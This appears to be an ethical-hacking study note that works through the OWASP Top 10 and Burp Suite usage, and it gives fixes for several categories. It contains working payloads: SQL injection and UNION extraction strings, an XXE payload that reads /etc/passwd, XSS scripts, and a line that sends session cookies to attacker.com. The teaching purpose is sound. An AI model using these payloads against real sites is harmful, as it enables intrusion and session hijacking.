### Web Application Hacking — OWASP Top 10

--> ⚠️ LEGAL / ETHICAL REMINDER: Only test the payloads and techniques below against applications you own or have explicit permission to test — DVWA (Damn Vulnerable Web Application) running locally, TryHackMe/HackTheBox web challenge boxes, OWASP Juice Shop, or an authorized client app that is explicitly in scope. Trying `' OR '1'='1` or `<script>alert(1)</script>` against a random real-world website is illegal, full stop.

--> The OWASP (Open Web Application Security Project) Top 10 is a regularly-updated list of the most critical web application security risks, based on real-world data. It's the standard "checklist" every web pentester and developer should know.
--> Think of it as the "greatest hits" of web vulnerabilities — if you understand these 10 categories deeply, you understand the vast majority of real-world web app bugs.

## 1. Injection (including SQL Injection)

--> Injection happens when untrusted user input is passed into an interpreter (SQL, OS shell, LDAP, etc.) without proper validation/escaping, letting the attacker change the meaning of the command.

==> SQL Injection (SQLi) — the classic example
--> A login form typically builds a query like this on the backend (PHP example):
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
--> If `$username` and `$password` come straight from user input with no sanitization, an attacker can break out of the string.

--> Classic payload:
```text
Username: ' OR '1'='1
Password: ' OR '1'='1
```
--> The query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```
--> `'1'='1'` is always TRUE, so the `WHERE` clause matches every row in the table — the login check passes even with no valid credentials, often logging the attacker in as the very first user in the table (frequently the admin).

--> Other useful SQLi test payloads (for authorized testing, e.g. DVWA's SQLi module):
```sql
' OR 1=1 --          -- "--" comments out the rest of the original query in MySQL
admin' --             -- comments out the password check entirely, logs in as admin if that user exists
' UNION SELECT username, password FROM users --   -- classic UNION-based data extraction
```
--> The fix (for developers, know this too): use parameterized queries / prepared statements, where user input is always treated as DATA, never as part of the SQL command itself.
```php
// Safe version using PDO prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

## 2. Broken Authentication

--> Weaknesses in login, session management, or credential handling that let attackers compromise accounts.
--> Common examples: weak password policies, no account lockout (allows brute-forcing), predictable session tokens, session IDs exposed in the URL, credentials sent over plain HTTP.
--> Testing approach: try default creds (`admin:admin`), try brute-forcing with a tool like Hydra against a login form, check if the session cookie changes after login (it should — "session fixation" is a bug if it doesn't).

## 3. Sensitive Data Exposure (Cryptographic Failures)

--> Applications that fail to properly protect sensitive data — passwords stored in plaintext or weak hashes (MD5 without salting), credit card numbers unencrypted in a database, no HTTPS enforced.
--> Testing approach: check if the site forces HTTPS, check response headers for `Strict-Transport-Security`, check if error messages or API responses leak more data than needed (e.g. a password hash field showing up in a JSON API response).

## 4. XML External Entities (XXE)

--> Happens when an application parses XML input and the XML parser is configured to resolve "external entities" — references to external files or URLs embedded inside the XML itself.
--> Example malicious XML payload, used against an app that parses uploaded XML (e.g. an XML-based file import feature):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
  <name>&xxe;</name>
</userInfo>
```
--> If the parser resolves `&xxe;`, the contents of `/etc/passwd` (a classic Linux file with user account info) get reflected back in the application's response — an attacker just read a local file on the server through an XML field.
--> Fix: disable external entity resolution (`DOCTYPE`/DTD processing) in the XML parser configuration — most modern XML libraries have a simple flag for this.

## 5. Broken Access Control

--> The application fails to properly enforce what a logged-in user IS and ISN'T allowed to do or see.
--> Classic sub-type: IDOR (Insecure Direct Object Reference) — changing an ID in a URL/API call to access someone else's data.
```text
https://example.com/account?user_id=1053     # your own account
https://example.com/account?user_id=1054     # someone else's account — does the app check you're allowed to view this?
```
--> Also includes: a regular user reaching an admin-only page just by guessing/knowing the URL (`/admin/dashboard`) because the server never re-checks permissions on that route, only hides the link in the UI.
--> Testing approach: log in as a low-privilege user, note every URL/endpoint used, then try accessing admin-only or other-users'-data URLs directly.

## 6. Security Misconfiguration

--> The broad "the app/server wasn't hardened properly" category.
--> Examples: default credentials left unchanged, directory listing enabled (`Index of /uploads/`), verbose error messages revealing stack traces and server paths, unnecessary services/ports open, outdated software with known CVEs still running (see note 03's example of Apache 2.2.8 on Metasploitable2), missing security headers (`X-Frame-Options`, `Content-Security-Policy`).
--> Testing approach: check HTTP response headers, try common default admin panels/paths (`/admin`, `/phpmyadmin`, `/.env`, `/wp-admin`), trigger an error deliberately (send malformed input) and see how much detail the error message reveals.

## 7. Cross-Site Scripting (XSS)

--> XSS happens when an application includes untrusted user input in a web page without properly escaping it, letting an attacker inject their own JavaScript that runs in OTHER users' browsers.

--> Classic test/proof-of-concept payload:
```html
<script>alert(1)</script>
```
--> If you submit this into, say, a comment box, and later visiting that page pops up an alert box, the input was rendered as executable HTML/JS instead of being treated as plain text — that's the vulnerability confirmed.

--> Three types of XSS:
1. Reflected XSS – the malicious script comes from the current request (e.g. a URL parameter) and is immediately reflected back in the response. Requires tricking a victim into clicking a crafted link.
```text
https://example.com/search?q=<script>alert(document.cookie)</script>
```
2. Stored XSS – the malicious script is saved on the server (e.g. in a comment, a profile bio) and served to EVERY user who views that page later. More dangerous — no need to trick anyone into a special link, just wait.
3. DOM-based XSS – the vulnerability lives entirely in client-side JavaScript that unsafely writes user-controllable data into the page's DOM (e.g. via `innerHTML`), without the payload ever necessarily touching the server.

--> A more "real" malicious-style payload (for authorized labs only) — stealing cookies to hijack a session:
```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
--> Fix: always encode/escape user-controlled output before rendering it as HTML (e.g. convert `<` to `&lt;`), and set the `HttpOnly` flag on session cookies so JavaScript can't read them at all even if XSS exists.

## 8. Insecure Deserialization

--> "Serialization" converts an in-memory object into a storable/transmittable format (e.g. a PHP `serialize()` string, a Java serialized object, a Python pickle). "Deserialization" converts it back.
--> If an application deserializes data that came from an untrusted source (a user-controlled cookie, a hidden form field) without validation, an attacker can craft malicious serialized data that, when deserialized, executes arbitrary code or manipulates application logic (e.g. changing an `isAdmin` flag from false to true inside the serialized object).
--> Testing approach: look for base64-looking cookie/parameter values, decode them, see if they look like a serialized object structure (`O:8:"stdClass"` is a tell-tale PHP serialization pattern), try modifying and re-encoding.

## 9. Using Components with Known Vulnerabilities

--> Modern apps are built from dozens/hundreds of third-party libraries and frameworks (npm packages, Composer/PHP packages, WordPress plugins). If any of them has a known CVE and isn't patched, the whole app inherits that vulnerability.
--> Testing approach: identify the exact versions of frameworks/libraries in use (HTTP response headers, JS file comments, `/wp-content/plugins/` listings on WordPress sites) and cross-reference against CVE databases — the same mindset as version-checking services in nmap (note 03).
--> Real-world tools for this: `npm audit`, OWASP Dependency-Check, WPScan (specifically for WordPress plugin/theme vulnerabilities).

## 10. Insufficient Logging and Monitoring

--> Not a single exploitable bug you attack directly — it's about the fact that many breaches go undetected for months because the application doesn't log security-relevant events (failed logins, access control failures, input validation failures) or nobody is monitoring/alerting on those logs.
--> As a pentester, you note this as a finding when you can perform obviously suspicious actions (repeated failed logins, SQLi payloads, directory traversal attempts) and see NO alerting, rate-limiting, or lockout occur.
--> This connects back to the Blue Team side of security (note 01) — logging + monitoring is what lets defenders actually catch an attack in progress instead of finding out from a customer or the news.

## How Burp Suite Fits In

--> Burp Suite is the standard tool for manually testing web applications — it sits as a proxy between your browser and the target website, letting you see and manipulate every single HTTP request/response.

==> Proxy tab
--> This is Burp's core — it intercepts traffic between your browser and the target. You configure your browser to send traffic through Burp (usually `127.0.0.1:8080`), then every request can be paused, inspected, and edited before it's forwarded to the server. This is how you first "see" the raw HTTP request behind a login form, search box, or API call before attacking it.

==> Repeater tab
--> Once you've captured an interesting request in the Proxy, you send it to Repeater. Repeater lets you resend the SAME request over and over with small manual edits (e.g. changing a parameter value to `' OR '1'='1`) and instantly see the response — perfect for manually testing SQLi, XSS, and IDOR payloads one at a time while reading the response carefully.

==> Intruder tab
--> Intruder automates sending MANY variations of a request — you mark a position in the request (e.g. the username field) and provide a list of payloads (a wordlist of usernames, a list of SQLi test strings, a password list). Intruder fires each payload in that position and captures all the responses, which you then compare (by response length, status code, or specific text) to spot which payload succeeded. This is the tool used for brute-forcing logins or fuzzing many injection payloads quickly.

--> Typical Burp workflow for testing a login form for SQLi (conceptual, DVWA-style):
1. Set browser proxy to Burp, log the login request in Proxy.
2. Send it to Repeater, manually try `' OR '1'='1` in the username field, observe if you get logged in or an SQL error appears.
3. If promising, send the same request to Intruder, load a full SQLi payload wordlist into the username position, fire, and scan the results for a different response length/status that indicates success.

--> With the OWASP Top 10 and Burp Suite basics understood, note 05 covers exploiting a vulnerable SERVICE (not a web app) end-to-end using Metasploit.
